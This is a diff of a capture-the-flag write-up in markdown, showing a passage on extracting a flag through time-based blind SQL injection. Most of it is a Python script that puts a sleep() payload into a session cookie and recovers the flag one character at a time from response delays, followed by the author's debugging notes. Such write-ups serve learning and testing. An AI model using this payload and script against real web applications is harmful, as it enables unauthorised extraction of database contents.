@@ -402,7 +402,13 @@ So the last bits of it is to get the flag value
 
 Again, if you have the confidence, you can directly skip Step 2 and 3 as well.
 
-To determine the actual value, it's best to apply an automated script:
+To determine the actual value, it's best to apply an automated script rather than bruteforcing each time on intruder.
+However, this step has actually taken me more than I should (for a script-kiddie like me it has been painful to scripting) but here's my learning after this challenge:
+- Apply proxies to assist the actual requests output on burpsuite (so we can verify what's wrong and what's not)
+- Waiting too many seconds (20 or 10 sec instead of 5 sec now) for the positive responses which in turn created too many false negatives and a rabbit hole for myself to figure out what's wrong with the script. Since it's a time-based SQLi, this should carefully be considered.
+- Encode the whole payload which is not supposed to, again, verify with the actual requests
+- One liner may not work so might as well just split them for easier substitute of variables
+- Do remember to # comment on the script for future uses.
 
 ```
 import urllib
@@ -411,37 +417,41 @@ import string
 import urllib
 import urllib3
 
+#Disable urllib3 warning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+#Apply proxies
 proxies = {'http': 'http:127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 
-
+#Target URL
 url_form = "http://[..snip..]/admin/adminlogon.php"
-#payload = "'%2b(select+sleep(10)+from+dual+where+(select+*+from+flag+where+flag+like+'%25hackaday{}%25'+limit+0,1)+like+'%25')%23%2b'"
-#cookies = {"admin_session_id": "c92797db11bd65128c08121a7fe5f080"+payload, "session_id": "903da9688d0a0d2a8d04f36da0af44a1"}
+
+#Looping the list of characters
 possible_chars = list("{}+?_" + string.digits + string.ascii_lowercase + string.ascii_uppercase)
 headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 
    }
 
 found_chars = ""
+# use while True to loop this repetition
 while True:
     for new_char in possible_chars:
 	attempt = found_chars + new_char
-	attempt = attempt.replace("_","[_]")
+	#attempt = attempt.replace("_","[_]")
         print("[*] Attempt: '{}'.".format(attempt))
+	#payload to be included in cookie
         payload_1 = "'%2b(select+sleep(10)+from+dual+where+(select+*+from+flag+where+flag+like+'%25"
         payload_2 = attempt
         payload_3 = "%25'+limit+0,1)+like+'%25')%23%2b'"
         payload = payload_1+payload_2+payload_3
-        #payload = "'%2b(select+sleep(10)+from+dual+where+(select+*+from+flag+where+flag+like+'%25hackaday{attempt}%25'+limit+0,1)+like+'%25')%23%2b'"
         cookies = {"admin_session_id": "c92797db11bd65128c08121a7fe5f080"+payload, "session_id": "903da9688d0a0d2a8d04f36da0af44a1"}
         #data = payload.format(attempt)
         #print("[*] Payload: {}.".format(data))
         page = requests.get(url_form, cookies=cookies, verify=False, proxies=proxies, headers=headers)
-    
+    #if the request elapse more than 5 seconds, then it's a positive
         if int(page.elapsed.total_seconds()) > 5:
-            found_chars += new_char
+            #adding up the last character to the next
+	    found_chars += new_char
             print("[*] Found chars: '{}'".format(found_chars))
             break
     
@@ -451,9 +461,18 @@ while True:
 print("The FLAG is: {}".format(found_chars))
 ```
 
+![image](https://user-images.githubusercontent.com/94167587/145303505-cd7689ce-e4b5-4651-a411-6c7f84e59957.png)
 
+Ta Da! Bear in mind that the _ will produce false positive because mysql escape an underscore. While I use an educated guess and reuse the found characters to directly find the char after the underscore, there should be a better way to include such in the script.
+
+```
+Work in Progress
+https://www.w3schools.com/python/ref_string_replace.asp
+https://stackoverflow.com/questions/5821/sql-server-escape-an-underscore/5822
+```
 
 Some good reference: [Security Idiots](http://www.securityidiots.com/Web-Pentest/SQL-Injection/time-based-blind-injection.html)
+[writeup19294](https://ctftime.org/writeup/19294)
 
 
 **Injection Point 2**
